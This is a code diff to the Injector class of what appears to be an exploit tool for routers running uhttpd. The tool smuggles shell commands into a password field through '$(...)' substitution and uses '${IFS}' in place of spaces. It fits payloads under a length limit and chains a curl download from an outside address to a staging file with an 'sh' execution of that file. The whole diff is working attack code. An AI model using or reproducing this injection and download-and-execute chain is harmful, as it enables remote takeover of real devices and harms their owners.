@@ -323,13 +323,14 @@ class Injector:
 
     def __init__(self, salt: str | None = None):
         self.salt = salt or random_salt()
+        self.staging_path = STAGING_PATH
 
     def encode(self, command: str) -> str:
         expr = command.replace(" ", "${IFS}")
         password = f"{self.salt}$({expr})"
         if len(password) > PASSWORD_MAX and len(self.salt) > 2:
-            self.salt = self.salt[:2]
-            password = f"{self.salt}$({expr})"
+            salt = self.salt[:2]
+            password = f"{salt}$({expr})"
         if len(password) > PASSWORD_MAX:
             over = len(password) - PASSWORD_MAX
             raise IduError(
@@ -346,12 +347,17 @@ class Injector:
     def download(self, address: str, path: str = STAGING_PATH) -> str:
         cmd = f"curl {address}>{path}"
         expr = cmd.replace(" ", "${IFS}")
-        if len(f"{self.salt[:2]}$({expr})") > PASSWORD_MAX and path == STAGING_PATH:
-            # On stock uhttpd CWD is '/', so 'a' writes to '/a' while saving 1 byte
+        if len(f"{self.salt}$({expr})") > PASSWORD_MAX and path == STAGING_PATH:
             cmd = f"curl {address}>a"
+            path = "a"
+        self.staging_path = path
+        expr = cmd.replace(" ", "${IFS}")
+        if len(f"{self.salt}$({expr})") > PASSWORD_MAX:
+            return Injector(self.salt[:2]).encode(cmd)
         return self.encode(cmd)
 
-    def execute(self, path: str = STAGING_PATH) -> str:
+    def execute(self, path: str | None = None) -> str:
+        path = path or self.staging_path
         return self.encode(f"sh {path}")
 
     def literal(self, length: int = 16) -> str:
